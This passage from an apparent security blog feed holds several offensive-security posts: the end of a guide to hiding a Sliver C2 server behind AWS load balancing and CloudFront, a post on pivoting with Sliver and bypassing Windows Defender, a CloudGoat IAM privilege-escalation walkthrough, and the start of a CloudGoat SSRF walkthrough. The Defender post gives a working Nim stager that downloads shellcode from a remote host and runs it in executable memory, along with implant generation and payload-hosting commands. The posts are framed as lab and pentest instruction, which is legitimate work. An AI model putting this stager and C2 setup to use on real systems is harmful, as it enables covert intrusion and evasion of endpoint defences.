class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>Reload the <code>daemon</code> and check the status</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status sliver-server</span><br></pre></td></tr></table></figure><p>Now we can run the sliver agent and we are in</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sliver-client_linux</span><br></pre></td></tr></table></figure><p>You can stop here id you dont want a Load Balancer and CloudFront if your security group is setup well you can start http&#x2F;https listeners and send your payloads to your target.<br>(tip ligolo-ng is a great tool to have for pivoting you can install it also on the EC2 and just expose the port that you will be running it from to the internet). If you want security BUT not the hustle of using a Load Balancer and CloudFront in your security groups allow http&#x2F;https ports and the ligolo port to be exposed only to the machine IP you are pentesting.<br>Ligolo setup tutorial:</p><h2 id="1-Create-an-Application-Load-Balancer-ALB"><a href="#1-Create-an-Application-Load-Balancer-ALB" class="headerlink" title="1. Create an Application Load Balancer (ALB)"></a>1. Create an Application Load Balancer (ALB)</h2><ol><li>In the EC2 Console, navigate to Load Balancers → Create Load Balancer.</li><li>Choose Application Load Balancer, give it a name, and select your VPC and subnets.</li><li>Under Security Groups, attach (or create) one that allows HTTP&#x2F;HTTPS from wherever your operators will connect.</li></ol><h2 id="2-Define-a-Target-Group"><a href="#2-Define-a-Target-Group" class="headerlink" title="2. Define a Target Group"></a>2. Define a Target Group</h2><ol><li>Still in the Load Balancer wizard, create a new Target Group of type “Instances.”</li><li>Choose the same VPC, set the protocol (HTTP or HTTPS), and click Next.</li><li>Select your Sliver server instance, click Include as pending, then Create target group.</li></ol><h2 id="3-Hook-the-Target-Group-into-the-ALB"><a href="#3-Hook-the-Target-Group-into-the-ALB" class="headerlink" title="3. Hook the Target Group into the ALB"></a>3. Hook the Target Group into the ALB</h2><ol><li>Back on the ALB page, under Listeners &amp; routing, add (or edit) a listener on port 80 or 443.</li><li>Point that listener to your newly created Target Group.</li><li>Finish creating the Load Balancer.</li></ol><h2 id="4-Update-the-Sliver-Instance’s-Security-Group"><a href="#4-Update-the-Sliver-Instance’s-Security-Group" class="headerlink" title="4. Update the Sliver Instance’s Security Group"></a>4. Update the Sliver Instance’s Security Group</h2><ol><li>In Security Groups, find the SG attached to your Sliver instance.</li><li>Edit its inbound rules: add a Custom TCP rule on port 80 (or 443) with the source set to your ALB’s security group.</li></ol><h2 id="5-Create-a-CloudFront-Distribution"><a href="#5-Create-a-CloudFront-Distribution" class="headerlink" title="5. Create a CloudFront Distribution"></a>5. Create a CloudFront Distribution</h2><ol><li>In the CloudFront Console, Create Distribution → Web.</li><li>Set Origin Domain to your ALB’s DNS name.</li><li>Restrict viewer protocol to HTTPS Only, and allow all HTTP methods.</li><li>Choose an appropriate cache policy (e.g. “Caching Optimized”), then Create Distribution.</li><li>Copy your new CloudFront domain name—this becomes your public C2 endpoint.<br>Disclaimer: When fronting Sliver C2 with an AWS Application Load Balancer or CloudFront, only HTTP and HTTPS listeners (ports 80&#x2F;443) are supported end-to-end. Any other protocol (e.g. raw TCP for mTLS) or non-HTTP(S) port will be rejected or dropped by the proxy layer.</li></ol><h3 id="Debugging-Tips"><a href="#Debugging-Tips" class="headerlink" title="Debugging Tips"></a>Debugging Tips</h3><ol><li><p>Verify Listener Configuration</p><ul><li>In the ALB&#x2F;CloudFront console, ensure you have an HTTP (80) or HTTPS (443) listener pointing to your Sliver target group.</li><li>If using HTTPS, confirm the certificate is correctly attached and not expired.</li></ul></li><li><p>Check Security Groups</p><ul><li>ALB SG must allow inbound on 80&#x2F;443 from your operator IPs.</li><li>Backend instance SG must allow inbound from the ALB’s SG on the same port.</li></ul></li><li><p>Target Group Health</p><ul><li>In EC2 → Target Groups, confirm your Sliver instance shows as healthy.</li><li>If it’s unhealthy, examine the health-check path&#x2F;protocol—Sliver C2 typically responds on <code>/favicon.ico</code> or a custom HTTP path you’ve defined.</li></ul></li><li><p>Test Connectivity</p><ul><li>From your workstation:</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://&lt;ALB-DNS&gt;:80/ # HTTPS curl -v https://&lt;ALB-DNS&gt;:443/ --cacert /path/to/ca.pem</span><br></pre></td></tr></table></figure><p>A valid Sliver HTTP(S) listener will return a 200 OK or a small redirection payload.<br>  5. Inspect Logs<br>     * Enable ALB access logs in S3 to see if requests are reaching the load balancer.<br>     * On the Ubuntu host, check <code>journalctl -u sliver-server</code> for any incoming connection or TLS errors.<br>  6. Fallback to Direct Connect<br>     * Temporarily open the instance’s security group to 0.0.0.0&#x2F;0 on your chosen port and test <code>sliver-client --server https://&lt;EC2-IP&gt;:&lt;port&gt;</code>.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Sliver </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sliver-Tunneling-and-AV-bypass</title>
      <link href="/2025/06/10/Sliver-Tunneling-and-AV-bypass/"/>
      <url>/2025/06/10/Sliver-Tunneling-and-AV-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="Pivoting-and-Bypassing-Defender-with-Sliver-C2"><a href="#Pivoting-and-Bypassing-Defender-with-Sliver-C2" class="headerlink" title="Pivoting and Bypassing Defender with Sliver C2"></a>Pivoting and Bypassing Defender with Sliver C2</h1><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>Sliver provides an <a href="https://github.com/BishopFox/sliver/tree/master?tab=readme-ov-file">install script</a> which gets you up and running in no time. You can run it with:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sliver.sh/install | sudo bash</span><br></pre></td></tr></table></figure><p>After installation, you can type <code>sliver</code> in the terminal.</p><p><img src="/images/Sliver_Tunnel/sliver_base.png" alt="Image: Sliver Base"></p><p>As the jumpbox is a Linux machine, let’s first create an implant for it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate --os linux --arch amd64 --format elf --mtls 10.8.0.15 --save ~/Downloads/shell.elf</span><br></pre></td></tr></table></figure><p>Also, create a listener for it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtls --lport 8888</span><br></pre></td></tr></table></figure><p>On your Kali machine, use Python to host the file so you can grab it from the jumpbox:</p><p>Kali:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>Jumpbox:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.8.0.15/shell.elf</span><br></pre></td></tr></table></figure><p>Now give it executable permissions and run it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure><p>Sliver session grabbed:</p><p><img src="/images/Sliver_Tunnel/session_sliver.png" alt="Image: Session Sliver"></p><p>Use the command <code>sessions</code> to view active sessions and their IDs. Use <code>use &lt;ID&gt;</code> to interact with the desired session.</p><hr><h2 id="Tunneling"><a href="#Tunneling" class="headerlink" title="Tunneling"></a>Tunneling</h2><p>First, we need to check if there’s an internal network on the machine we’re on. Run:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p><img src="/images/Sliver_Tunnel/ifconfig.png" alt="Image: Ifconfig Output"></p><p>Now we know there’s an internal network at <code>10.0.0.0/24</code>. Let’s use a SOCKS5 proxy to access that internal network. First, look into <code>/etc/proxychains.conf</code> — it should look like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks5  127.0.0.1   1081</span><br></pre></td></tr></table></figure><p>Now in Sliver (inside the session), run:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 start</span><br></pre></td></tr></table></figure><p><img src="/images/Sliver_Tunnel/it_wokrs.png" alt="Image: SOCKS5 Works"><br>Now using:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains4 &lt;command&gt;</span><br></pre></td></tr></table></figure><p>…you can proxy your commands and grab ports from the internal network, exposing them for further enumeration.</p><hr><h2 id="Lab-Setup"><a href="#Lab-Setup" class="headerlink" title="Lab Setup"></a>Lab Setup</h2><p>We have one machine that’s our jumpbox and a Windows machine that we need to access using Sliver. We’ll need to:</p><ul><li>Bypass AV</li><li>Reverse ports</li><li>Set up stagers</li><li>Host our payload</li></ul><p><img src="/images/Sliver_Tunnel/network.png" alt="Image: Network Topology"></p><p>The Windows PC can only reach the jumpbox, and we can reach the Windows PC through the jumpbox.</p><hr><h2 id="Setting-up-Sliver"><a href="#Setting-up-Sliver" class="headerlink" title="Setting up Sliver"></a>Setting up Sliver</h2><p>Set the session port that will connect to us:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd add -b 10.0.0.7:7999 -r 0.0.0.0:7999</span><br></pre></td></tr></table></figure><p>Generate the shellcode that our target will grab and execute:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate --mtls 10.0.0.7:7999 --os windows --arch amd64 --format shellcode --save ~/Downloads/shellc.bin</span><br></pre></td></tr></table></figure><p>Upload the binary to the jumpbox:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /path/shellc.bin</span><br></pre></td></tr></table></figure><p>Create a Python server on the jumpbox:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 1998</span><br></pre></td></tr></table></figure><p>Note that it points to <code>10.0.0.7</code> (the jumpbox), so we forward that port to us.</p><p>Finally, create your listener:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtls --lport 7999</span><br></pre></td></tr></table></figure><hr><h2 id="Stager"><a href="#Stager" class="headerlink" title="Stager"></a>Stager</h2><p>We’ll use a custom stager from this post:<br><a href="https://www.numencyber.com/defeating-windows-defender-using-different-programming-languages-with-sliver-c2-shellcode/">https://www.numencyber.com/defeating-windows-defender-using-different-programming-languages-with-sliver-c2-shellcode/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import winim/lean</span><br><span class="line">import httpclient</span><br><span class="line">func toByteSeq*(str: string): seq[byte] &#123;.inline.&#125; =</span><br><span class="line">  @(str.toOpenArrayByte(0, str.high))</span><br><span class="line"></span><br><span class="line">proc DownloadExecute(url: string): void =</span><br><span class="line">  var client = newHttpClient()</span><br><span class="line">  var response: string = client.getContent(url)</span><br><span class="line"></span><br><span class="line">  var shellcode: seq[byte] = toByteSeq(response)</span><br><span class="line">  let tProcess = GetCurrentProcessId()</span><br><span class="line">  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)</span><br><span class="line">  defer: CloseHandle(pHandle)</span><br><span class="line">  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)</span><br><span class="line">  copyMem(rPtr, addr shellcode[0], len(shellcode))</span><br><span class="line"></span><br><span class="line">  let f = cast[proc() &#123;.nimcall.&#125;](rPtr)</span><br><span class="line">  f()</span><br><span class="line"></span><br><span class="line">when defined(windows):</span><br><span class="line">  when isMainModule:</span><br><span class="line">    DownloadExecute(&quot;http://&lt;JUMPBOX_IP&gt;:1999/shellc.bin&quot;)</span><br></pre></td></tr></table></figure><p>Replace <code>&quot;http://&lt;JUMPBOX_IP&gt;:1999/shellc.bin&quot;</code> with your actual jumpbox IP.</p><p>Now compile it with Nim, send it to the Windows target, and execute it.<br>If it doesn’t work, verify the <code>.bin</code> is being downloaded correctly and that your reverse ports are configured properly.</p><p><img src="/images/Sliver_Tunnel/boom.png" alt="Image: Shell Popped"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C2 </tag>
            
            <tag> Sliver </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CloudGoat-Iam_Privesc_By_Attachment</title>
      <link href="/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/"/>
      <url>/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/</url>
      
        <content type="html"><![CDATA[<h1 id="CloudGoat-iam-privesc-by-attachment-Walkthrough-Complete-Guide-to-AWS-IAM-Privilege-Escalation"><a href="#CloudGoat-iam-privesc-by-attachment-Walkthrough-Complete-Guide-to-AWS-IAM-Privilege-Escalation" class="headerlink" title="CloudGoat iam_privesc_by_attachment Walkthrough: Complete Guide to AWS IAM Privilege Escalation"></a>CloudGoat iam_privesc_by_attachment Walkthrough: Complete Guide to AWS IAM Privilege Escalation</h1><p>Description: This comprehensive walkthrough demonstrates how to exploit IAM privilege escalation vulnerabilities in AWS using CloudGoat’s iam_privesc_by_attachment scenario. Learn advanced AWS penetration testing techniques with CloudTap, a powerful enumeration tool, to escalate privileges and terminate EC2 instances through IAM role manipulation.</p><h2 id="Initial-Setup-and-Configuration"><a href="#Initial-Setup-and-Configuration" class="headerlink" title="Initial Setup and Configuration"></a>Initial Setup and Configuration</h2><p>First, let’s configure our CloudGoat environment by whitelisting our IP address:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure><p>Next, we’ll create the vulnerable environment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create iam_privesc_by_attachment</span><br></pre></td></tr></table></figure><p>Upon successful deployment, we receive our initial access credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[cloudgoat] terraform output completed with no error code.</span><br><span class="line">cloudgoat_output_aws_account_id = [REDACTED]</span><br><span class="line">cloudgoat_output_kerrigan_access_key_id = [REDACTED]</span><br><span class="line">cloudgoat_output_kerrigan_secret_key = [REDACTED]</span><br></pre></td></tr></table></figure><p>Mission Objective: Delete the EC2 instance named “cg-super-critical-security-server”</p><h2 id="Reconnaissance-with-CloudTap"><a href="#Reconnaissance-with-CloudTap" class="headerlink" title="Reconnaissance with CloudTap"></a>Reconnaissance with CloudTap</h2><p>For our initial enumeration, we’ll leverage <a href="CloudGoat-Iam_Privesc_By_Attachment">CloudTap</a>, a powerful AWS reconnaissance tool that automates the discovery of cloud resources and misconfigurations.</p><p>Configure the AWS profile:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile init</span><br></pre></td></tr></table></figure><p>Run CloudTap enumeration:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys init</span><br></pre></td></tr></table></figure><p>CloudTap reveals critical information about running EC2 instances:</p><p><img src="/images/Iam_Privesc_By_Attachment/ec2_info.png" alt="EC2 Instance Information"></p><h2 id="IAM-Instance-Profile-Discovery"><a href="#IAM-Instance-Profile-Discovery" class="headerlink" title="IAM Instance Profile Discovery"></a>IAM Instance Profile Discovery</h2><p>Through systematic enumeration, we discover that we can list instance profiles in the environment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-instance-profiles --profile init</span><br></pre></td></tr></table></figure><p>This reveals an important instance profile structure with associated IAM roles. The response shows us a key instance profile that will be crucial for our escalation path.</p><h2 id="Role-Policy-Analysis"><a href="#Role-Policy-Analysis" class="headerlink" title="Role Policy Analysis"></a>Role Policy Analysis</h2><p>CloudTap successfully enumerates role policies, providing us with comprehensive information about the available IAM roles:</p><p><img src="/images/Iam_Privesc_By_Attachment/role_policy.png" alt="Role Policy Information"></p><p>The enumeration reveals two distinct IAM roles:</p><ul><li><code>cg-ec2-meek-role-&lt;CLOUD_GOAT_ID&gt;</code></li><li><code>cg-ec2-mighty-role-&lt;CLOUD_GOAT_ID&gt;</code></li></ul><p>The naming convention suggests a permission hierarchy, with “mighty” likely having elevated privileges compared to “meek.”</p><h2 id="Understanding-the-Privilege-Escalation-Vector"><a href="#Understanding-the-Privilege-Escalation-Vector" class="headerlink" title="Understanding the Privilege Escalation Vector"></a>Understanding the Privilege Escalation Vector</h2><p>Direct enumeration of these roles fails with “Access Denied” errors. However, we can leverage a common AWS security misconfiguration: IAM role attachment to EC2 instances.</p><p>Since IAM roles cannot be directly attached to EC2 instances (they require Instance Profiles), we need to:</p><ol><li>Create a new EC2 instance with an existing instance profile</li><li>Modify the instance profile to use the higher-privileged role</li><li>Use the EC2 instance to enumerate and exploit the elevated permissions</li></ol><h2 id="Prerequisites-for-EC2-Instance-Creation"><a href="#Prerequisites-for-EC2-Instance-Creation" class="headerlink" title="Prerequisites for EC2 Instance Creation"></a>Prerequisites for EC2 Instance Creation</h2><p>To successfully create our exploitation EC2 instance, we need:</p><h3 id="1-Subnet-Information"><a href="#1-Subnet-Information" class="headerlink" title="1. Subnet Information"></a>1. Subnet Information</h3><p>Identify the subnet used by the target EC2 instance:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 describe-instances \</span><br><span class="line">    --query &#x27;Reservations[*].Instances[*].[SubnetId]&#x27; \</span><br><span class="line">    --output text --profile init</span><br></pre></td></tr></table></figure><h3 id="2-Security-Group-Configuration"><a href="#2-Security-Group-Configuration" class="headerlink" title="2. Security Group Configuration"></a>2. Security Group Configuration</h3><p>Enumerate security groups to find one allowing SSH access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 describe-security-groups --profile init</span><br></pre></td></tr></table></figure><h3 id="3-SSH-Key-Pair-Creation"><a href="#3-SSH-Key-Pair-Creation" class="headerlink" title="3. SSH Key Pair Creation"></a>3. SSH Key Pair Creation</h3><p>Generate a new key pair for secure access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 create-key-pair \</span><br><span class="line">    --key-name exploitation-key \</span><br><span class="line">    --query &#x27;KeyMaterial&#x27; \</span><br><span class="line">    --output text &gt; exploitation-key.pem \</span><br><span class="line">    --region us-east-1 \</span><br><span class="line">    --profile init</span><br></pre></td></tr></table></figure><h2 id="Creating-the-Exploitation-EC2-Instance"><a href="#Creating-the-Exploitation-EC2-Instance" class="headerlink" title="Creating the Exploitation EC2 Instance"></a>Creating the Exploitation EC2 Instance</h2><p>With all prerequisites gathered, we can create our exploitation instance:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 run-instances \</span><br><span class="line">    --image-id ami-0a313d6098716f372 \</span><br><span class="line">    --instance-type t2.micro \</span><br><span class="line">    --iam-instance-profile Arn=[INSTANCE_PROFILE_ARN] \</span><br><span class="line">    --key-name exploitation-key \</span><br><span class="line">    --subnet-id [SUBNET_ID] \</span><br><span class="line">    --security-group-ids [SECURITY_GROUP_ID] \</span><br><span class="line">    --region us-east-1 \</span><br><span class="line">    --profile init</span><br></pre></td></tr></table></figure><h2 id="IAM-Role-Escalation-Through-Instance-Profile-Manipulation"><a href="#IAM-Role-Escalation-Through-Instance-Profile-Manipulation" class="headerlink" title="IAM Role Escalation Through Instance Profile Manipulation"></a>IAM Role Escalation Through Instance Profile Manipulation</h2><p>Now comes the critical privilege escalation step. We’ll swap the “meek” role for the “mighty” role:</p><h3 id="Remove-the-Low-Privilege-Role"><a href="#Remove-the-Low-Privilege-Role" class="headerlink" title="Remove the Low-Privilege Role:"></a>Remove the Low-Privilege Role:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws iam remove-role-from-instance-profile \</span><br><span class="line">    --instance-profile-name [INSTANCE_PROFILE_NAME] \</span><br><span class="line">    --role-name [MEEK_ROLE_NAME] \</span><br><span class="line">    --profile init</span><br></pre></td></tr></table></figure><h3 id="Attach-the-High-Privilege-Role"><a href="#Attach-the-High-Privilege-Role" class="headerlink" title="Attach the High-Privilege Role:"></a>Attach the High-Privilege Role:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws iam add-role-to-instance-profile \</span><br><span class="line">    --instance-profile-name [INSTANCE_PROFILE_NAME] \</span><br><span class="line">    --role-name [MIGHTY_ROLE_NAME] \</span><br><span class="line">    --profile init</span><br></pre></td></tr></table></figure><h2 id="Accessing-the-Compromised-Instance"><a href="#Accessing-the-Compromised-Instance" class="headerlink" title="Accessing the Compromised Instance"></a>Accessing the Compromised Instance</h2><h3 id="1-Set-proper-permissions-for-the-SSH-key"><a href="#1-Set-proper-permissions-for-the-SSH-key" class="headerlink" title="1. Set proper permissions for the SSH key:"></a>1. Set proper permissions for the SSH key:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 exploitation-key.pem</span><br></pre></td></tr></table></figure><h3 id="2-Retrieve-the-public-IP-address"><a href="#2-Retrieve-the-public-IP-address" class="headerlink" title="2. Retrieve the public IP address:"></a>2. Retrieve the public IP address:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 describe-instances \</span><br><span class="line">    --query &quot;Reservations[*].Instances[*].PublicIpAddress&quot; \</span><br><span class="line">    --output text \</span><br><span class="line">    --profile init</span><br></pre></td></tr></table></figure><h3 id="3-SSH-into-the-instance"><a href="#3-SSH-into-the-instance" class="headerlink" title="3. SSH into the instance:"></a>3. SSH into the instance:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i exploitation-key.pem ubuntu@[PUBLIC_IP]</span><br></pre></td></tr></table></figure><h2 id="Post-Exploitation-Privilege-Verification-and-Target-Elimination"><a href="#Post-Exploitation-Privilege-Verification-and-Target-Elimination" class="headerlink" title="Post-Exploitation: Privilege Verification and Target Elimination"></a>Post-Exploitation: Privilege Verification and Target Elimination</h2><p>Once connected to the compromised EC2 instance, install the AWS CLI:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install awscli</span><br></pre></td></tr></table></figure><h3 id="Enumerate-the-Escalated-Privileges"><a href="#Enumerate-the-Escalated-Privileges" class="headerlink" title="Enumerate the Escalated Privileges:"></a>Enumerate the Escalated Privileges:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-policies --query &quot;Policies[?starts_with(PolicyName, &#x27;cg&#x27;)]&quot;</span><br><span class="line"></span><br><span class="line">aws iam get-policy-version \</span><br><span class="line">    --policy-arn &quot;arn:aws:iam::[ACCOUNT_ID]:policy/cg-ec2-mighty-policy&quot; \</span><br><span class="line">    --version-id &quot;v1&quot;</span><br></pre></td></tr></table></figure><p>The policy analysis reveals that the <code>cg-ec2-mighty-role</code> provides administrative access to the AWS account.</p><h3 id="Mission-Completion-Target-Termination"><a href="#Mission-Completion-Target-Termination" class="headerlink" title="Mission Completion: Target Termination"></a>Mission Completion: Target Termination</h3><p>With administrative privileges confirmed, locate and terminate the target instance:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 describe-instances --region us-east-1</span><br><span class="line">aws ec2 terminate-instances --instance-ids [TARGET_INSTANCE_ID] --region us-east-1</span><br></pre></td></tr></table></figure><h2 id="Cleanup-and-Environment-Destruction"><a href="#Cleanup-and-Environment-Destruction" class="headerlink" title="Cleanup and Environment Destruction"></a>Cleanup and Environment Destruction</h2><p>Important Disclaimer: After completing this walkthrough, ensure you clean up all resources to avoid unnecessary charges and maintain a clean environment.</p><h3 id="1-Terminate-the-Exploitation-EC2-Instance"><a href="#1-Terminate-the-Exploitation-EC2-Instance" class="headerlink" title="1. Terminate the Exploitation EC2 Instance"></a>1. Terminate the Exploitation EC2 Instance</h3><p>Delete the EC2 instance you created during the privilege escalation process:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 terminate-instances --instance-ids [YOUR_EXPLOITATION_INSTANCE_ID] --region us-east-1 --profile init</span><br></pre></td></tr></table></figure><h3 id="2-Destroy-the-CloudGoat-Environment"><a href="#2-Destroy-the-CloudGoat-Environment" class="headerlink" title="2. Destroy the CloudGoat Environment"></a>2. Destroy the CloudGoat Environment</h3><p>Once you’ve completed the walkthrough and cleaned up your exploitation resources, destroy the entire CloudGoat scenario:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat destroy iam_privesc_by_attachment</span><br></pre></td></tr></table></figure><p>This command will remove all AWS resources created by the CloudGoat scenario, ensuring no residual infrastructure remains.</p><p>This walkthrough is part of a comprehensive AWS penetration testing series. For more cloud security content and tools like CloudTap, visit our <a href="CloudGoat-Iam_Privesc_By_Attachment">GitHub repository</a>.</p>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CloudGoat-EC2_SSRF</title>
      <link href="/2025/06/03/CloudGoat-EC2-SSRF/"/>
      <url>/2025/06/03/CloudGoat-EC2-SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="CloudGoat-EC2-SSRF-Challenge-Complete-Walkthrough-with-CloudTap"><a href="#CloudGoat-EC2-SSRF-Challenge-Complete-Walkthrough-with-CloudTap" class="headerlink" title="CloudGoat EC2 SSRF Challenge: Complete Walkthrough with CloudTap"></a>CloudGoat EC2 SSRF Challenge: Complete Walkthrough with CloudTap</h1><p>This comprehensive walkthrough demonstrates how to exploit Server-Side Request Forgery (SSRF) vulnerabilities in AWS EC2 instances using the CloudGoat ec2_ssrf scenario. We’ll leverage <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a>, a powerful AWS enumeration tool, to streamline our reconnaissance and privilege escalation process.</p><p>Keywords: CloudGoat, ec2_ssrf, SSRF exploitation, AWS penetration testing, CloudTap, EC2 metadata service, AWS enumeration</p><h2 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h2><ul><li>CloudGoat properly installed and configured</li><li>CloudTap tool available (<a href="https://github.com/PanosoikoGr/CloudTap">GitHub Repository</a>)</li><li>Basic understanding of AWS services and SSRF vulnerabilities</li></ul><h2 id="Step-1-Environment-Setup"><a href="#Step-1-Environment-Setup" class="headerlink" title="Step 1: Environment Setup"></a>Step 1: Environment Setup</h2><p>First, configure CloudGoat by whitelisting your IP address:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure><p>Deploy the ec2_ssrf scenario:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 